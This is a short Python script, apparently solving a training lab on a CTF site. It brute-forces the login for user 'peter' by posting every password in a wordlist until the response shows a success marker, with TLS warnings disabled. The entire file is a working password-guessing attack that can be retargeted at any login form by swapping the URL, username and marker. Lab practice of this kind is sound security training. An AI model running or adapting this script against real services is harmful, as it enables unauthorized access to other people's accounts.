import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = 'https://labs.matesctf.org/lab/auth/6/index.php?page=login'

f_password = open("./wordlist/passwords_2fa.txt", "r").read().splitlines()

for p in f_password:
    x = requests.post(url, data={"username" : "peter", "password" : p } , allow_redirects=False)
    print(p)
    if("code" in x.text):
        print("this is your password : " + p)
        break